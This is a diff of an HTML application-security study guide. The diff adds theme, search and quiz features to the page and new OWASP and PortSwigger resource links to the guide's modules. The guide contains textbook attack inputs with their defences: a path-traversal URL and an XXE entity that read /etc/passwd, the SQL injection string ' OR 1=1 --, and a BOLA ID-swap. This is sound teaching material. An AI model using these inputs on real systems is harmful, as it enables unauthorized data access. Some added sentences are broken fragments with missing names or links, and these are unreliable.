@@ -1,10 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>The Complete Application Security Guide</title>
-    <!-- Dummy Comment-->
+    <meta name="description" content="Zero to Job-Ready in 18 Weeks. The ultimate AppSec study guide for freshers targeting top Indian tech companies.">
+    
     <!-- Marked.js for Markdown parsing -->
     <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
     
@@ -18,6 +19,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
 
     <style>
+        /* =================== THEME VARIABLES =================== */
         :root {
             --bg-color: #0f111a;
             --sidebar-bg: #161925;
@@ -29,15 +31,37 @@
             --code-bg: #1e293b;
             --table-border: #334155;
             --table-header: #1e293b;
+            --toolbar-bg: #161925;
+            --search-bg: #1e293b;
+            --highlight-bg: rgba(250, 204, 21, 0.3);
+            --progress-bg: #1e293b;
+            --progress-fill: #38bdf8;
+            --overlay-bg: rgba(0, 0, 0, 0.5);
         }
 
-        html {
-            scroll-behavior: smooth;
+        [data-theme="light"] {
+            --bg-color: #f8fafc;
+            --sidebar-bg: #ffffff;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --accent: #0284c7;
+            --accent-hover: #0369a1;
+            --border-color: #e2e8f0;
+            --code-bg: #f1f5f9;
+            --table-border: #cbd5e1;
+            --table-header: #e2e8f0;
+            --toolbar-bg: #ffffff;
+            --search-bg: #f1f5f9;
+            --highlight-bg: rgba(250, 204, 21, 0.4);
+            --progress-bg: #e2e8f0;
+            --progress-fill: #0284c7;
+            --overlay-bg: rgba(0, 0, 0, 0.3);
         }
+
+        html { scroll-behavior: smooth; }
 
         body {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             font-family: 'Inter', sans-serif;
             background-color: var(--bg-color);
             color: var(--text-main);
@@ -45,9 +69,71 @@
             height: 100vh;
             overflow: hidden;
             line-height: 1.6;
+            transition: background-color 0.3s ease, color 0.3s ease;
         }
 
-        /* Sidebar Styling */
+        /* =================== TOOLBAR =================== */
+        #toolbar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 20px;
+            background-color: var(--toolbar-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 15;
+            flex-wrap: wrap;
+        }
+
+        .toolbar-btn {
+            background: none;
+            border: 1px solid var(--border-color);
+            color: var(--text-muted);
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s ease;
+            white-space: nowrap;
+        }
+        .toolbar-btn:hover { background-color: rgba(56, 189, 248, 0.1); color: var(--accent); border-color: var(--accent); }
+        .toolbar-btn.active { background-color: rgba(56, 189, 248, 0.15); color: var(--accent); border-color: var(--accent); }
+
+        #search-input {
+            background-color: var(--search-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            width: 200px;
+            transition: all 0.2s ease;
+        }
+        #search-input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2); }
+        #search-count { font-size: 0.75rem; color: var(--text-muted); }
+
+        /* =================== PROGRESS BAR =================== */
+        #progress-bar-container {
+            width: 100%;
+            height: 4px;
+            background-color: var(--progress-bg);
+            position: sticky;
+            top: 0;
+            z-index: 16;
+        }
+        #progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), #a78bfa);
+            width: 0%;
+            transition: width 0.4s ease;
+            border-radius: 0 2px 2px 0;
+        }
+
+        /* =================== SIDEBAR =================== */
         #sidebar {
             width: 300px;
             background-color: var(--sidebar-bg);
@@ -55,7 +141,8 @@
             overflow-y: auto;
             display: flex;
             flex-direction: column;
-            transition: transform 0.3s ease;
+            transition: transform 0.3s ease, background-color 0.3s ease;
+            flex-shrink: 0;
         }
 
         #sidebar-header {
@@ -81,29 +168,46 @@
             margin: 0;
         }
 
-        #toc li {
-            margin-bottom: 4px;
+        #toc li { margin-bottom: 4px; display: flex; align-items: center; gap: 6px; }
+
+        .toc-checkbox {
+            appearance: none; -webkit-appearance: none;
+            width: 16px; height: 16px; min-width: 16px;
+            border: 1.5px solid var(--border-color);
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+        .toc-checkbox:checked {
+            background-color: var(--accent);
+            border-color: var(--accent);
+        }
+        .toc-checkbox:checked::after {
+            content: '✓';
+            position: absolute;
+            top: -1px; left: 2px;
+            font-size: 11px;
+            color: white;
+            font-weight: bold;
         }
 
         #toc a {
             text-decoration: none;
             color: var(--text-muted);
             display: block;
-            padding: 8px 12px;
+            padding: 6px 10px;
             border-radius: 6px;
             font-size: 0.9rem;
             transition: all 0.2s ease;
+            flex: 1;
         }
 
-        #toc a:hover {
-            background-color: rgba(56, 189, 248, 0.1);
-            color: var(--accent);
-        }
+        #toc a:hover { background-color: rgba(56, 189, 248, 0.1); color: var(--accent); }
+        #toc .toc-h2 a { padding-left: 12px; font-size: 0.85rem; }
+        #toc .toc-h3 a { padding-left: 24px; font-size: 0.8rem; opacity: 0.8; }
 
-        #toc .toc-h2 { padding-left: 24px; font-size: 0.85rem; }
-        #toc .toc-h3 { padding-left: 36px; font-size: 0.8rem; opacity: 0.8; }
-
-        /* Main Content Styling */
+        /* =================== MAIN CONTENT =================== */
         #main-wrapper {
             flex: 1;
             overflow-y: auto;
@@ -113,26 +217,46 @@
         #content-container {
             max-width: 900px;
             margin: 0 auto;
-            padding: 60px 40px 100px 40px;
+            padding: 40px 40px 100px 40px;
         }
 
-        /* Markdown Elements Styling */
+        /* =================== MARKDOWN ELEMENTS =================== */
         h1, h2, h3, h4 {
-            color: #ffffff;
+            color: var(--text-main);
             margin-top: 2em;
             margin-bottom: 0.5em;
             font-weight: 600;
             letter-spacing: -0.02em;
         }
-
-        h1 { font-size: 2.5rem; margin-top: 0; }
+        h1 { font-size: 2.5rem; margin-top: 0; color: #ffffff; }
         h2 { font-size: 1.75rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.3em; }
         h3 { font-size: 1.35rem; color: var(--accent); }
+
+        [data-theme="light"] h1 { color: #0f172a; }
 
         a { color: var(--accent); text-decoration: none; }
         a:hover { text-decoration: underline; }
 
         p { margin-bottom: 1.2em; font-size: 1.05rem; }
+
+        /* Collapsible sections */
+        .section-collapsible { overflow: hidden; transition: max-height 0.3s ease, opacity 0.3s ease; }
+        .section-collapsible.collapsed { max-height: 0 !important; opacity: 0; }
+
+        .collapse-toggle {
+            cursor: pointer;
+            user-select: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .collapse-toggle::after {
+            content: '▾';
+            font-size: 0.75em;
+            transition: transform 0.2s ease;
+            color: var(--text-muted);
+        }
+        .collapse-toggle.collapsed-heading::after { transform: rotate(-90deg); }
 
         /* Code blocks */
         pre {
@@ -143,7 +267,7 @@
             border: 1px solid var(--border-color);
             margin: 1.5em 0;
         }
-        
+
         code {
             font-family: 'Fira Code', monospace;
             font-size: 0.9em;
@@ -155,6 +279,10 @@
             border-radius: 4px;
             color: #fca5a5;
         }
+        [data-theme="light"] p > code, [data-theme="light"] li > code {
+            background-color: rgba(0, 0, 0, 0.06);
+            color: #dc2626;
+        }
 
         /* Tables */
         table {
@@ -163,20 +291,10 @@
             margin: 2em 0;
             font-size: 0.95rem;
         }
-
-        th, td {
-            border: 1px solid var(--table-border);
-            padding: 12px 16px;
-            text-align: left;
-        }
-
-        th {
-            background-color: var(--table-header);
-            font-weight: 600;
-            color: white;
-        }
-
+        th, td { border: 1px solid var(--table-border); padding: 12px 16px; text-align: left; }
+        th { background-color: var(--table-header); font-weight: 600; }
         tr:nth-child(even) { background-color: rgba(255, 255, 255, 0.02); }
+        [data-theme="light"] tr:nth-child(even) { background-color: rgba(0, 0, 0, 0.02); }
 
         /* Details / Summary */
         details {
@@ -186,27 +304,17 @@
             padding: 16px;
             margin: 1em 0;
         }
-
-        summary {
-            font-weight: 600;
-            cursor: pointer;
-            color: var(--accent);
-            outline: none;
-            list-style: none;
-            display: flex;
-            align-items: center;
-        }
-        
+        [data-theme="light"] details { background-color: rgba(0, 0, 0, 0.02); }
+        summary { font-weight: 600; cursor: pointer; color: var(--accent); outline: none; list-style: none; display: flex; align-items: center; }
         summary::-webkit-details-marker { display: none; }
-        summary::before {
-            content: '▶';
-            font-size: 0.8em;
-            margin-right: 10px;
-            transition: transform 0.2s ease;
-        }
-        
+        summary::before { content: '▶'; font-size: 0.8em; margin-right: 10px; transition: transform 0.2s ease; }
         details[open] summary::before { transform: rotate(90deg); }
         details[open] summary { margin-bottom: 15px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; }
+
+        /* Quiz mode styling */
+        body.quiz-mode details { border-color: var(--accent); border-width: 2px; }
+        body.quiz-mode details summary { color: #f59e0b; }
+        body.quiz-mode details:not([open])::after { content: '👆 Click the question above to reveal the answer'; display: block; color: var(--text-muted); font-style: italic; padding: 8px 0; font-size: 0.85rem; }
 
         /* Blockquotes */
         blockquote {
@@ -218,60 +326,116 @@
             font-style: italic;
         }
 
-        /* Mobile Header & Hamburger */
+        /* Search Highlight */
+        mark.search-highlight {
+            background-color: var(--highlight-bg);
+            color: inherit;
+            padding: 1px 3px;
+            border-radius: 3px;
+        }
+
+        /* =================== BACK TO TOP =================== */
+        #back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent), #a78bfa);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 1.2rem;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(56, 189, 248, 0.3);
+            transition: all 0.3s ease;
+            z-index: 50;
+        }
+        #back-to-top:hover { transform: translateY(-3px); box-shadow: 0 6px 20px rgba(56, 189, 248, 0.4); }
+        #back-to-top.visible { display: flex; }
+
+        /* =================== MOBILE OVERLAY =================== */
+        #sidebar-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: var(--overlay-bg);
+            z-index: 99;
+        }
+        #sidebar-overlay.active { display: block; }
+
+        /* =================== MOBILE HEADER & HAMBURGER =================== */
         #mobile-header {
             display: none;
-            background-color: var(--sidebar-bg);
-            padding: 15px 20px;
+            background-color: var(--toolbar-bg);
+            padding: 12px 20px;
             border-bottom: 1px solid var(--border-color);
             align-items: center;
             justify-content: space-between;
             position: fixed;
-            top: 0;
-            left: 0;
+            top: 0; left: 0;
             width: 100%;
             box-sizing: border-box;
             z-index: 200;
         }
-        #mobile-header h2 { margin: 0; font-size: 1.1rem; color: var(--accent); }
+        #mobile-header h2 { margin: 0; font-size: 1rem; color: var(--accent); }
         .menu-btn { background: none; border: none; color: var(--text-main); font-size: 1.5rem; cursor: pointer; }
 
-        /* Responsive */
+        /* =================== RESPONSIVE =================== */
         @media (max-width: 768px) {
-            body { display: block; overflow: auto; height: auto; margin-top: 60px; }
+            body { display: block; overflow: auto; height: auto; margin-top: 55px; }
             #mobile-header { display: flex; }
-            #sidebar { 
-                position: fixed; 
-                top: 0; 
-                left: -300px; 
-                width: 280px; 
-                height: 100vh; 
-                z-index: 100; 
-                transition: left 0.3s ease; 
-                border-right: 1px solid var(--border-color); 
+            #sidebar {
+                position: fixed;
+                top: 0; left: -300px;
+                width: 280px;
+                height: 100vh;
+                z-index: 100;
+                transition: left 0.3s ease;
+                border-right: 1px solid var(--border-color);
             }
             #sidebar.open { left: 0; }
             #main-wrapper { overflow: visible; display: block; height: auto; }
             #content-container { padding: 20px 15px; }
-            
+            #toolbar { padding: 8px 15px; gap: 6px; }
+            #search-input { width: 120px; }
+            .toolbar-btn { padding: 5px 8px; font-size: 0.75rem; }
             h1 { font-size: 1.8rem; margin-top: 1em; }
             h2 { font-size: 1.4rem; }
             pre { padding: 12px; font-size: 0.85em; }
+            #back-to-top { bottom: 20px; right: 20px; width: 42px; height: 42px; font-size: 1rem; }
+            table { font-size: 0.8rem; display: block; overflow-x: auto; }
         }
-        
-        /* Scrollbar */
+
+        /* =================== SCROLLBAR =================== */
         ::-webkit-scrollbar { width: 8px; height: 8px; }
         ::-webkit-scrollbar-track { background: var(--bg-color); }
         ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
         ::-webkit-scrollbar-thumb:hover { background: var(--table-border); }
+
+        /* =================== LISTS =================== */
+        ul, ol { margin-bottom: 1.2em; }
+        li { margin-bottom: 0.4em; }
     </style>
 </head>
 <body>
+    <!-- Mobile Header -->
     <div id="mobile-header">
         <h2>🛡️ AppSec Guide</h2>
-        <button class="menu-btn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+        <div style="display:flex;gap:8px;align-items:center;">
+            <button class="menu-btn" id="mobile-theme-btn" onclick="toggleTheme()" title="Toggle theme">🌓</button>
+            <button class="menu-btn" onclick="toggleMobileSidebar()" title="Menu">☰</button>
+        </div>
     </div>
 
+    <!-- Sidebar Overlay for Mobile -->
+    <div id="sidebar-overlay" onclick="toggleMobileSidebar()"></div>
+
+    <!-- Sidebar -->
     <div id="sidebar">
         <div id="sidebar-header">
             <h2>🛡️ AppSec Guide</h2>
@@ -279,9 +443,27 @@
         <ul id="toc"></ul>
     </div>
 
+    <!-- Main Content -->
     <div id="main-wrapper">
+        <!-- Progress Bar -->
+        <div id="progress-bar-container">
+            <div id="progress-bar"></div>
+        </div>
+
+        <!-- Toolbar -->
+        <div id="toolbar">
+            <input type="text" id="search-input" placeholder="🔍 Search content..." oninput="handleSearch(this.value)">
+            <span id="search-count"></span>
+            <button class="toolbar-btn" id="quiz-btn" onclick="toggleQuizMode()" title="Toggle quiz mode">🧠 Quiz</button>
+            <button class="toolbar-btn" id="collapse-btn" onclick="toggleCollapseAll()" title="Collapse/Expand all sections">📂 Collapse All</button>
+            <button class="toolbar-btn" id="theme-btn" onclick="toggleTheme()" title="Toggle dark/light mode">🌓 Light</button>
+        </div>
+
         <div id="content-container"></div>
     </div>
+
+    <!-- Back to Top -->
+    <button id="back-to-top" onclick="scrollToTop()" title="Back to top">⬆</button>
 
     <!-- The raw markdown is stored here securely -->
     <textarea id="raw-markdown" style="display: none;">
@@ -315,15 +497,31 @@ Welcome to the ultimate Application Security study guide! This guide is meticulo
 Navigate through the individual modules below:
 
 - 📖 [01: Security Fundamentals](#section-01_security_basics) — (Weeks 1-2)
-- 🌐 [02: Web Application Architecture](#section-02_web_architecture) — (Weeks 3-4)
-- 🐛 [03: Web Security Vulnerabilities](#section-03_web_vulnerabilities) — (Weeks 5-8)
-- 🔌 [04: API Security](#section-04_api_security) — (Weeks 9-10)
-- 📱 [05: Android Application Security](#section-05_android_security) — (Weeks 11-12)
-- 🔍 [06: SAST and SCA](#section-06_sast_sca) — (Weeks 13-14)
-- 🚀 [07: DevSecOps Practices](#section-07_devsecops) — (Weeks 15-16)
-- 🎤 [08: Interview Preparation & Company Patterns](#section-08_interview_prep)
-- ✅ [09: Post-Course Readiness Checklist & Resources](#section-09_readiness_checklist)
-- ☁️ [10: Advanced Topics & Cloud Security](#section-10_advanced_topics) — (Weeks 17-18)
+- 🌐 [02: Web Application Architecture & Protocols](#section-02_web_architecture) — (Weeks 3-4)
+- 🐛 [03: Web Application Vulnerabilities & OWASP Top 10](#section-03_web_vulnerabilities) — (Weeks 5-8)
+- 🔌 [04: API Security & Business Logic Flaws](#section-04_api_security) — (Weeks 9-10)
+- 📱 [05: Android Application Security & Reverse Engineering](#section-05_android_security) — (Weeks 11-12)
+- 🔍 [06: SAST, SCA & Supply Chain Security](#section-06_sast_sca) — (Weeks 13-14)
+- 🚀 [07: DevSecOps Practices & CI/CD Pipelines](#section-07_devsecops) — (Weeks 15-16)
+- ☁️ [08: Advanced Topics, AWS & Cloud Security](#section-08_cloud_advanced) — (Weeks 17-18)
+- 💻 [09: Secure Code Review & PR Remediation](#section-09_secure_code_review) — Practical Code Audits
+- 🎯 [10: Bug Bounty Methodology & Offensive Reconnaissance](#section-10_bug_bounty_recon) — Discovery Pipelines
+- 📦 [11: The AppSec Tester's Payload Reference Library](#section-11_payload_library) — Exploits & WAF Bypasses
+- 🧪 [12: PortSwigger Web Security Academy Lab Tracker](#section-12_lab_tracker) — Interactive Lab Roadmap
+- 🎤 [13: Interview Preparation & Company Whiteboard Patterns](#section-13_interview_prep) — Q&A Mastery
+- ✅ [14: Post-Course Readiness & Capstone Career Checklist](#section-14_readiness_checklist) — Final Verification
+
+## ⌨️ Interactive Platform Keyboard Shortcuts
+
+When using the interactive HTML single-page learning platform (`appsec_guide_interactive.html`), master these keyboard shortcuts for lightning-fast navigation during intensive study sessions:
+
+| Key Binding | Action Triggered |
+| :--- | :--- |
+| **`Ctrl + K`** or **`/`** | Instantly focus and activate the Global Search Bar |
+| **`Q`** | Toggle **Quiz / Flashcard Mode** on/off (Hides answers for interview self-testing) |
+| **`T`** | Switch instantly between **Dark and Light Themes** |
+| **`C`** | Toggle **Collapse / Expand All** module heading sections globally |
+| **`Esc`** | Close search field focus or hide mobile navigation drawer |
 
 ## 💡 How to Use This Guide
 
@@ -337,7 +535,7 @@ Navigate through the individual modules below:
 ---
 
 <a id="section-01_security_basics"></a>
-# Section 1: Security Fundamentals (Weeks 1-2)
+# 📖 01: Security Fundamentals (Weeks 1-2)
 
 Welcome to the foundation of Application Security (AppSec)! If you're coming from a Python or web development background with zero security knowledge, you are in the right place. In development, we focus on making things *work*. In AppSec, we focus on *how things can be broken* and how to stop that from happening. 
 
@@ -379,6 +577,8 @@ When you look at a web application, you must ask:
 *   ❌ **Wrong:** Security is just about keeping hackers out (Confidentiality).
 *   ✅ **Correct:** Security is equally about ensuring data is accurate (Integrity) and systems are usable (Availability).
 
+For a quick visual overview of the CIA Triad, Chuck's explanation on YouTube. You can also refer to the [OWASP Core Security Requirements](https://owasp.org/www-project-core-security-requirements/) for deeper context.
+
 <details>
 <summary>🎤 Interview Q: If you had to prioritize one pillar of the CIA triad for a hospital's critical patient care system, which would it be?</summary>
 
@@ -387,7 +587,6 @@ While all three are crucial, **Availability** is often the most critical in real
 </details>
 
 ---
-
 
 ## 2. Authentication vs. Authorization vs. Accounting (AAA) 🔑
 
@@ -416,6 +615,8 @@ Insecure Direct Object Reference (IDOR), also known as Broken Object Level Autho
 *   ✅ **Correct:** JWTs are primarily used to carry *authorization* claims after *authentication* has already happened.
 *   ❌ **Wrong:** A 401 status code means "Unauthorized."
 *   ✅ **Correct:** Actually, HTTP 401 officially means "Unauthenticated" (you need to log in). HTTP 403 means "Unauthorized" (you are logged in, but lack permissions). The naming in the HTTP spec is famously confusing!
+
+To dive deeper into Authentication and Authorization, reviewing the [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) and [Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html) is highly recommended.
 
 <details>
 <summary>🎤 Interview Q: Explain the difference between Authentication and Authorization with a web app example. What vulnerabilities arise from failing each?</summary>
@@ -465,6 +666,8 @@ These are the architectural rules that guide secure software design.
 ### 8. Economy of Mechanism
 **What it is:** Keep the design as simple and small as possible. Complexity is the enemy of security.
 
+For an extensive read on these concepts, check out the [OWASP Security by Design Principles](https://owasp.org/www-project-developer-guide/draft/design/security_principles).
+
 <details>
 <summary>🎤 Interview Q: What is Defense in Depth? Give an example of how you'd apply it to protect user passwords.</summary>
 
@@ -478,7 +681,6 @@ Defense in Depth means applying multiple layers of security so a single failure 
 </details>
 
 ---
-
 
 ## 4. Cryptography Essentials 🔐
 
@@ -554,8 +756,9 @@ JWTs don't actually use *encryption* by default; they use *digital signatures* f
 *Note: JWTs can be encrypted (JWE), often using algorithms like RSA-OAEP for key wrapping and AES-GCM for payload encryption.*
 </details>
 
----
+To truly grasp the math and logic behind these encryption standards, Computerphile's Cryptography Playlist on YouTube is phenomenal, especially their videos on AES and Hashing. You should also bookmark the [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html).
 
+---
 
 ## 5. Networking for Security 🌐
 
@@ -625,11 +828,11 @@ This is a trick question. ICMP (Internet Control Message Protocol), which is use
 The core of Nmap is written in **C and C++**. However, the Nmap Scripting Engine (NSE), which allows for custom vulnerability checks and advanced scanning, is written in **Lua**.
 </details>
 
+If networking concepts feel abstract, Chuck's Free CCNA Playlist to build a rock-solid foundation.
+
 ---
 
-
 ---
-
 
 ## 6. Same-Origin Policy (SOP) — DEEP TREATMENT
 
@@ -664,8 +867,9 @@ Think of **SOP** as a locked door in your house — no one can enter from outsid
 - **SOP** = rule that stops malicious sites from *reading* your data across origins.
 - **CSRF** = tricking your browser into *sending* unwanted requests to a site where you’re logged in — **SOP does not prevent this** because it blocks reading, not sending.
 
----
+For an excellent animated explanation, 's Same-Origin Policy video. Additionally, read the official [MDN Web Docs on Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy).
 
+---
 
 ## 7. CORS (Cross-Origin Resource Sharing) — DEEP TREATMENT
 
@@ -726,7 +930,7 @@ To safely allow `shop.com` AND `*.shop.com`:
 4. **Return the exact matched origin string** in `Access-Control-Allow-Origin`.
 5. Include `Vary: Origin` so caches don’t mix responses.
 
-
+To master CORS, PwnFunction's CORS Explained is a must-watch. You can also refer to the [MDN Web Docs on CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) for official documentation.
 
 ## 8. Cookies Deep Dive 🍪
 
@@ -768,8 +972,9 @@ There are three primary ways to mitigate Cross-Site Request Forgery (CSRF):
 3. **Double Submit Cookie Pattern:** The server sends a random token in a cookie, and the frontend JS must read it and include it in a custom HTTP header (like `X-CSRF-Token`). The server validates that the cookie and header values match. Attackers can't read the cookie due to the SameOrigin Policy, so they can't forge the matching header.
 </details>
 
----
+For a deeper understanding of cookies and their attributes, consult the [MDN Web Docs on HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) and the [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html).
 
+---
 
 ## 9. Sessions and Tokens 🎫
 
@@ -837,7 +1042,7 @@ This is the most important tool in an AppSec engineer's arsenal. It is an Interc
 ---
 
 <a id="section-02_web_architecture"></a>
-# Section 2: Web Application Architecture & Protocols (Weeks 3-4)
+# 🌐 02: Web Application Architecture & Protocols (Weeks 3-4)
 
 Welcome to the **Web Application Architecture** section! To hack an application, you must first understand how it is built, how the components communicate, and where the weak links are. This section is an exhaustive deep dive into how modern web applications function and how to secure them.
 
@@ -888,7 +1093,6 @@ This architecture allows centralized data processing and storage (on servers) wh
 
 ---
 
-
 ## 2. HTTP Protocol Deep Dive
 
 ### What it is
@@ -934,6 +1138,8 @@ Set-Cookie: session=xyz; Secure; HttpOnly<-- Headers
 | **4xx** | Client Error | `401 Unauthorized` (needs login), `403 Forbidden` (logged in, but no access - check for IDOR/BOLA), `404 Not Found`. |
 | **5xx** | Server Error | `500 Internal Server Error` (Can leak stack traces). |
 
+For a great foundational understanding of HTTP basics, I recommend the [PortSwigger Academy HTTP basics guide](https://portswigger.net/web-security/learning-path/http-basics).
+
 ### HTTP Versions Comparison
 | Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
 |---------|----------|--------|--------|
@@ -978,7 +1184,6 @@ Defense: Use HTTP/2 end-to-end, or configure frontend/backend to consistently re
 
 ---
 
-
 ## 3. Security Headers — COMPREHENSIVE
 
 Security headers are HTTP response headers that instruct the browser on how to behave securely.
@@ -1017,8 +1222,9 @@ I would prioritize the following:
 6. **Cache-Control (`no-store, max-age=0`)**: Specifically for authenticated routes, to prevent sensitive data from being cached in the browser.
 </details>
 
----
+To test your application's security headers in real-time, you can use the [Mozilla Observatory](https://observatory.mozilla.org/).
 
+---
 
 ## 4. Session Management Deep Dive
 
@@ -1049,7 +1255,6 @@ Cookies are stored by the browser and automatically sent with requests to the ma
 5. Attacker uses their original `SID=123` and is now logged in as the Victim!
 
 ---
-
 
 ## 5. JWT (JSON Web Tokens) — DEEP TREATMENT
 
@@ -1232,7 +1437,7 @@ ABAC grants permissions by evaluating dynamic attributes of the user, the resour
 ---
 
 <a id="section-03_web_vulnerabilities"></a>
-# Section 3: Web Application Security Vulnerabilities (Weeks 5-8)
+# 🐛 03: Web Application Vulnerabilities & OWASP Top 10 (Weeks 5-8)
 
 Welcome to the largest and most critical section of this guide. We will dive extremely deep into Web Application Security Vulnerabilities. We cover what they are, why they happen, how to exploit them, how to fix them, and how to discuss them in top-tier interviews (HSBC, Flipkart, Razorpay, CRED, etc.).
 
@@ -1261,8 +1466,9 @@ Companies use the OWASP Top 10 to structure their security programs, build secur
 | 9 | Using Components with Known Vulnerabilities | Security Logging and Monitoring Failures | Expanded to include more types of monitoring failures. |
 | 10 | Insufficient Logging & Monitoring | Server-Side Request Forgery (SSRF) | **NEW** (from community survey). Deeply covered later in this guide. |
 
----
+To how these vulnerabilities work, I highly recommend watching PwnFunction's animated explanations on YouTube.
 
+---
 
 ## 2. Cross-Site Scripting (XSS) — DEEPEST TREATMENT
 
@@ -1441,9 +1647,13 @@ app.get('/greet', (req, res) => {
 - **Samy Worm (MySpace):** Stored XSS worm that gained over 1 million friends in 20 hours.
 - **British Airways (Magecart):** XSS used to inject a credit card skimmer into the payment page.
 
+For real-world examples, browse XSS reports on [HackerOne Hacktivity (filtered by XSS)](https://hackerone.com/hacktivity?querystring=XSS).
+
 ### 📚 Recommended Free Labs
 - **PortSwigger Web Security Academy:** XSS Labs (highly recommended)
 - **DVWA (Damn Vulnerable Web App):** XSS sections
+
+To get hands-on practice, you can jump directly into [PortSwigger's XSS labs](https://portswigger.net/web-security/cross-site-scripting).
 
 ---
 
@@ -1553,6 +1763,8 @@ Parameterized queries (Prepared Statements) separate the **compilation** phase f
 2. The database *then* binds the user input to `?`.
 Even if the input contains `' OR 1=1 --`, the database treats it as literal string data, not executable code, because the query has already been compiled.
 
+To walkthrough of SQLi labs, Khalil's PortSwigger SQLi walkthrough playlist. You can also -world SQLi reports on [HackerOne Hacktivity](https://hackerone.com/hacktivity?querystring=SQLi).
+
 ---
 
 ## 4. SSRF vs RFI
@@ -1592,6 +1804,8 @@ While both involve remote servers, the **intent and execution context** differ e
 
 ### 🌍 Real-world Impact: Capital One Breach (SSRF)
 In 2019, an attacker exploited an SSRF vulnerability in a Capital One WAF to query the AWS metadata service (`169.254.169.254`). They extracted the IAM role credentials attached to the WAF, which had excessive permissions, and used them to download 100 million customer records from S3 buckets.
+
+For practical insights on finding SSRF in bug bounties, 's bug bounty tips on YouTube. You can also view disclosed SSRF reports on [HackerOne Hacktivity](https://hackerone.com/hacktivity?querystring=SSRF).
 
 ---
 ## 5. CSRF (Cross-Site Request Forgery) — DEEP TREATMENT
@@ -1644,6 +1858,8 @@ Browsers automatically include cookies (including session cookies) in cross-orig
 - ❌ **Myth:** CSRF is applicable to APIs using JWT in the `Authorization: Bearer` header.
 - ✅ **Fact:** CSRF only applies when the browser *automatically* attaches credentials (like Cookies or HTTP Basic Auth). Browsers do not automatically attach Bearer tokens.
 
+See real-world CSRF impact on [HackerOne Hacktivity (filtered by CSRF)](https://hackerone.com/hacktivity?querystring=CSRF).
+
 ---
 
 ## 6. Broken Access Control (IDOR & Beyond)
@@ -1667,6 +1883,8 @@ IDOR occurs when an application provides direct access to objects based on user-
 An access control flaw where user input is used to construct a file path, allowing access to unintended files.
 - **Payload:** `https://app.com/download?file=../../../../etc/passwd`
 - **Defense:** Avoid using user input for filesystem APIs. If required, resolve the absolute path and ensure it starts with the intended base directory.
+
+Explore real IDOR reports on [HackerOne Hacktivity (filtered by IDOR)](https://hackerone.com/hacktivity?querystring=IDOR).
 
 ---
 
@@ -1770,6 +1988,8 @@ When parsed, `&xxe;` is replaced with the contents of `/etc/passwd`.
 
 ### 🛡️ Defense
 Disable External Entities and DTD processing entirely in the XML parser configuration.
+
+To practice XXE, check out [PortSwigger's XXE labs](https://portswigger.net/web-security/xxe). You can also browse real-world XXE examples on [HackerOne Hacktivity](https://hackerone.com/hacktivity?querystring=XXE).
 
 ---
 
@@ -1943,7 +2163,7 @@ If an attacker sends a request with a malicious unkeyed header (`X-Forwarded-Hos
 ---
 
 <a id="section-04_api_security"></a>
-# API SECURITY (Weeks 9-10)
+# 🔌 04: API Security & Business Logic Flaws (Weeks 9-10)
 
 ## 1. API Fundamentals
 
@@ -1981,6 +2201,7 @@ Swagger (OpenAPI) is a framework that helps design, build, document, and consume
 ---
 
 ## 2. OWASP API Security Top 10 (2023)
+For the official documentation, check out the [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/).
 
 ### 1. BOLA (Broken Object Level Authorization) — #1 Bug
 **What it is:** The API fails to validate if the currently authenticated user has the rights to access the requested object.
@@ -1996,7 +2217,7 @@ Swagger (OpenAPI) is a framework that helps design, build, document, and consume
 1. Attacker logs in and gets an auth token.
 2. Attacker observes an API call fetching their profile: `GET /api/users/1234`
 3. Attacker modifies the ID: `GET /api/users/1235`
-4. The API returns the profile of user 1235.
+4. The API returns the profile of user 1235. To practice finding BOLA vulnerabilities, try the [completely ridiculous API (crAPI)](https://github.com/OWASP/crAPI) vulnerable application by OWASP.
 
 **Code Example (Python FastAPI)**
 ```python
